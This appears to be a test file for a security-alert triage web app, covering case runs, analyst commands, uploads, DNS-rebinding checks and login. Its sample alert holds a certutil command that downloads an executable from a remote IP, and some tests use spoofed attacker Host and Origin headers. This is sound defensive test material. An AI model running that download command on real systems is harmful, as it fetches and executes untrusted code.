// The whole app over HTTP: UI, API, background jobs, analyst commands, uploads, login and request checks.
import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { loadConfig, type Config } from "../server/src/config";
import { openDatabase } from "../server/src/db";
import { loadDatabaseCases } from "../server/src/evaluate";
import { startApp, type App } from "../server/src/server";
import { createServices } from "../server/src/services";
import { standInServices } from "./helpers";

const ALERT = "EDR detection on WS-FIN-042\ncertutil.exe -urlcache -split -f http://45.9.1.2/p.exe C:\\Users\\Public\\p.exe";
const dirs: string[] = [];
const originalFetch = globalThis.fetch;

function testConfig(extra: Partial<Config> = {}): Config {
  const dir = mkdtempSync(join(tmpdir(), "jev-triage-test-")); dirs.push(dir);
  const base = loadConfig();
  return { ...base, host: "127.0.0.1", port: 0, dataDir: dir, databasePath: join(dir, "test.db"), uploadDir: join(dir, "uploads"), workerConcurrency: 2, retentionDays: 0, ai: { ...base.ai, mode: "off" }, auth: { user: undefined, password: undefined, allowNoAuth: false }, ...extra };
}
async function boot(config: Config): Promise<{ app: App; base: string }> {
  // Real upload storage and extraction; stand-in Jev and lookups (no network, no keys).
  const services = { ...createServices(config), ...pick(standInServices(), ["jevEvaluate", "shodanEntity", "virustotalLookup", "abuseIpdbLookup", "aiComplete"]) };
  const app = await startApp(config, { services, log: () => undefined, pollMs: 20 });
  return { app, base: `http://127.0.0.1:${app.server.port}` };
}
function pick<T extends object, K extends keyof T>(o: T, keys: K[]): Pick<T, K> { return Object.fromEntries(keys.map((k) => [k, o[k]])) as Pick<T, K>; }

let app: App; let base: string; let config: Config;
const api = async (action: string, body: unknown, headers: Record<string, string> = {}) => {
  const res = await originalFetch(`${base}/api/${action}`, { method: "POST", headers: { "Content-Type": "application/json", ...headers }, body: JSON.stringify(body) });
  return { status: res.status, body: (await res.json().catch(() => null)) as Record<string, any> };
};
async function waitFor(id: string, done: (c: Record<string, any>) => boolean): Promise<Record<string, any>> {
  for (let i = 0; i < 200; i += 1) { const { body } = await api("getCase", { id }); if (body.case && done(body.case)) return body.case; await Bun.sleep(25); }
  throw new Error("case did not finish");
}

beforeAll(async () => {
  // The engine also calls public key-free sources (DNS, RDAP, InternetDB): stub them.
  globalThis.fetch = (async () => new Response("{}", { status: 404 })) as unknown as typeof fetch;
  config = testConfig();
  ({ app, base } = await boot(config));
});
afterAll(async () => { await app.stop(); globalThis.fetch = originalFetch; for (const d of dirs) rmSync(d, { recursive: true, force: true }); });

describe("serving", () => {
  test("health check and UI", async () => {
    expect(await (await originalFetch(`${base}/healthz`)).json()).toEqual({ ok: true });
    const page = await originalFetch(`${base}/`);
    expect(page.headers.get("content-type")).toContain("text/html");
    expect(page.headers.get("content-security-policy")).toContain("default-src 'self'");
    const html = await page.text();
    const script = html.match(/src="(\/[^"]+\.js)"/)?.[1];
    expect(script).toBeTruthy();
    expect((await originalFetch(`${base}${script}`)).status).toBe(200);
  });
});

describe("investigating a case", () => {
  test("create, run in the background, and get a verdict", async () => {
    const created = await api("createCase", { alertText: ALERT });
    expect(created.body.ok).toBe(true);
    const run = await api("runCase", { id: created.body.id });
    expect(run.body).toMatchObject({ ok: true, status: "running" });
    const done = await waitFor(created.body.id, (c) => c.status === "completed");
    expect(done.verdict).toBe("malicious");
    const result = JSON.parse(done.resultJson);
    expect(result.behaviors.some((b: { technique: string }) => b.technique.startsWith("T1105"))).toBe(true);
    expect((await api("listCases", { limit: 10 })).body.cases.length).toBe(1);
  });

  test("/note reruns with context and /ask adds a Jev answer", async () => {
    const { body } = await api("createCase", { alertText: ALERT });
    await api("runCase", { id: body.id });
    await waitFor(body.id, (c) => c.status === "completed");
    const note = await api("runCommand", { caseId: body.id, command: "/note Approved red team exercise RT-2026-07." });
    expect(note.body.ok).toBe(true);
    const rerun = await waitFor(body.id, (c) => c.status === "completed" && c.runVersion === 2);
    expect(rerun.verdict).toBe("benign");
    const ask = await api("runCommand", { caseId: body.id, command: "/ask Was the parent process an IDE?" });
    expect(ask.body.ok).toBe(true);
    const after = await api("getCase", { id: body.id });
    expect(JSON.parse(after.body.case.resultJson).analystAnswers[0].answer).toBe("not stated");
  });

  test("upload a ZIP locked with 'infected'", async () => {
    const { BlobWriter, TextReader, ZipWriter } = await import("@zip.js/zip.js");
    const writer = new ZipWriter(new BlobWriter("application/zip"), { password: "infected", zipCrypto: true });
    await writer.add("alert.txt", new TextReader(ALERT));
    const bytes = Buffer.from(await (await writer.close()).arrayBuffer());
    const begin = await api("beginFileUpload", { fileName: "sample.zip", fileSize: bytes.byteLength });
    const chunk = await api("writeFileUploadChunk", { uploadId: begin.body.uploadId, chunkBase64: bytes.toString("base64"), reset: true });
    expect(chunk.body.ok).toBe(true);
    const finished = await api("finishFileUpload", { uploadId: begin.body.uploadId });
    expect(finished.body.ok).toBe(true);
    const c = await api("getCase", { id: finished.body.id });
    expect(c.body.case.inputText).toContain("certutil.exe");
    expect(c.body.case.title).toBe("sample.zip");
  });

  test("an analyst's decision is stored, can be changed, and becomes a labelled case", async () => {
    const { body } = await api("createCase", { alertText: ALERT });
    expect((await api("setDisposition", { caseId: body.id, label: "benign" })).body).toMatchObject({ ok: false, error: "Run the case before recording a decision." });
    await api("runCase", { id: body.id });
    await waitFor(body.id, (c) => c.status === "completed");
    expect((await api("setDisposition", { caseId: body.id, label: "benign", reason: "first thought" })).body.ok).toBe(true);
    expect((await api("setDisposition", { caseId: body.id, label: "malicious", reason: "  Payload confirmed by IR.  " })).body.ok).toBe(true);
    const { disposition } = (await api("getCase", { id: body.id })).body;
    expect(disposition).toMatchObject({ label: "malicious", reason: "Payload confirmed by IR.", decidedBy: "local", jevVerdict: "malicious" });
    expect((await api("setDisposition", { caseId: body.id, label: "unsure" })).status).toBe(400);
    const { db, sqlite } = openDatabase(config.databasePath);
    const labelled = (await loadDatabaseCases(db)).filter((c) => c.why === "Payload confirmed by IR.");
    sqlite.close();
    expect(labelled).toHaveLength(1);
    expect(labelled[0]).toMatchObject({ source: "database", label: "malicious", decidedBy: "local", notes: [] });
    expect(labelled[0]!.alert).toContain("certutil.exe");
  });

  test("approved memory reaches the ticket without a restart", async () => {
    const memoryDir = mkdtempSync(join(tmpdir(), "jev-memory-")); dirs.push(memoryDir);
    const { app: withMemory, base: mBase } = await boot(testConfig({ memoryDir }));
    const call = async (action: string, body: unknown) => (await (await originalFetch(`${mBase}/api/${action}`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body) })).json()) as Record<string, any>;
    const run = async () => {
      const created = await call("createCase", { alertText: "EDR alert: PsExec used for remote execution\nHost: SRV-APP-07\nUser: CORP\\svc_patching\nCommand: PsExec64.exe \\\\SRV-APP-08 -s C:\\Tools\\patch_agent.exe" });
      await call("runCase", { id: created.id });
      for (let i = 0; i < 200; i += 1) { const c = (await call("getCase", { id: created.id })).case; if (c?.status === "completed") return JSON.parse(c.resultJson); await Bun.sleep(25); }
      throw new Error("case did not finish");
    };
    try {
      expect((await run()).orgContext).toBeUndefined();
      mkdirSync(memoryDir, { recursive: true });
      writeFileSync(join(memoryDir, "context.yaml"), `entries:\n  - id: acct-svc-patching\n    kind: account\n    match: ["CORP\\\\svc_patching"]\n    note: "svc_patching is the patch automation account."\n    added_by: t\n    added_on: 2026-09-28\n`);
      expect((await run()).orgContext).toEqual([{ id: "acct-svc-patching", kind: "account", note: "svc_patching is the patch automation account." }]);
    } finally { await withMemory.stop(); }
  });

  test("delete removes the case", async () => {
    const { body } = await api("createCase", { alertText: "test alert" });
    expect((await api("deleteCase", { id: body.id })).body.ok).toBe(true);
    expect((await api("getCase", { id: body.id })).body.case).toBeNull();
  });
});

describe("request checks", () => {
  test("background handlers are not reachable over HTTP", async () => {
    expect((await api("processCase", { caseId: "x", runVersion: 1, mode: "initial" })).status).toBe(404);
  });
  test("invalid input, non-JSON and cross-site requests are refused", async () => {
    expect((await api("createCase", { alertText: "" })).status).toBe(400);
    expect((await originalFetch(`${base}/api/listCases`, { method: "POST", headers: { "Content-Type": "text/plain" }, body: "{}" })).status).toBe(415);
    expect((await api("listCases", {}, { Origin: "https://evil.example" })).status).toBe(403);
    expect((await originalFetch(`${base}/api/listCases`)).status).toBe(405);
  });
});

describe("DNS-rebinding protection (Host check)", () => {
  // A rebinding attack reaches 127.0.0.1 but the browser still sends the attacker's domain as the Host.
  const asHost = (host: string, path = "/api/listCases") => originalFetch(`${base}${path}`, {
    method: path.startsWith("/api/") ? "POST" : "GET",
    headers: { Host: host, "Content-Type": "application/json" },
    body: path.startsWith("/api/") ? "{}" : undefined,
  });
  test("requests addressed to another domain are refused (API and UI)", async () => {
    const port = app.server.port;
    expect((await asHost(`evil.example:${port}`)).status).toBe(403);
    expect((await asHost(`evil.example:${port}`, "/")).status).toBe(403);
    expect((await asHost(`attacker.rebind.network:${port}`)).status).toBe(403);
  });
  test("localhost, 127.0.0.1 and ::1 are accepted", async () => {
    const port = app.server.port;
    for (const host of [`localhost:${port}`, `127.0.0.1:${port}`, `[::1]:${port}`, "LOCALHOST"]) expect((await asHost(host)).status).toBe(200);
  });
  test("/healthz answers any host (no data in it)", async () => {
    expect((await asHost("load-balancer.internal", "/healthz")).status).toBe(200);
  });
  test("ALLOWED_HOSTS adds names; others stay refused", async () => {
    const { app: named, base: nBase } = await boot(testConfig({ allowedHosts: ["triage.corp.example"] }));
    try {
      const port = named.server.port;
      const call = (host: string) => originalFetch(`${nBase}/api/listCases`, { method: "POST", headers: { Host: host, "Content-Type": "application/json" }, body: "{}" });
      expect((await call(`triage.corp.example:${port}`)).status).toBe(200);
      expect((await call(`localhost:${port}`)).status).toBe(200);
      expect((await call(`evil.example:${port}`)).status).toBe(403);
    } finally { await named.stop(); }
  });
  test("with a login and no ALLOWED_HOSTS, the password is the protection (any host name)", async () => {
    const { app: secured, base: sBase } = await boot(testConfig({ auth: { user: "analyst", password: "pw", allowNoAuth: false } }));
    try {
      const good = "Basic " + Buffer.from("analyst:pw").toString("base64");
      const res = await originalFetch(`${sBase}/api/listCases`, { method: "POST", headers: { Host: "10.0.0.5:3000", "Content-Type": "application/json", Authorization: good }, body: "{}" });
      expect(res.status).toBe(200);
    } finally { await secured.stop(); }
  });
});

describe("login", () => {
  test("when AUTH_USER/AUTH_PASSWORD are set, everything but /healthz needs them", async () => {
    const { app: secured, base: sBase } = await boot(testConfig({ port: 0, auth: { user: "analyst", password: "correct horse", allowNoAuth: false } }));
    try {
      expect((await originalFetch(`${sBase}/`)).status).toBe(401);
      expect((await originalFetch(`${sBase}/healthz`)).status).toBe(200);
      const good = "Basic " + Buffer.from("analyst:correct horse").toString("base64");
      const bad = "Basic " + Buffer.from("analyst:wrong").toString("base64");
      const post = (auth: string) => originalFetch(`${sBase}/api/listCases`, { method: "POST", headers: { "Content-Type": "application/json", Authorization: auth }, body: "{}" });
      expect((await post(bad)).status).toBe(401);
      expect((await post(good)).status).toBe(200);
    } finally { await secured.stop(); }
  });
  test("refuses to listen on the network without a login", async () => {
    await expect(startApp(testConfig({ host: "0.0.0.0" }), { services: standInServices(), log: () => undefined })).rejects.toThrow("AUTH_USER");
  });
});
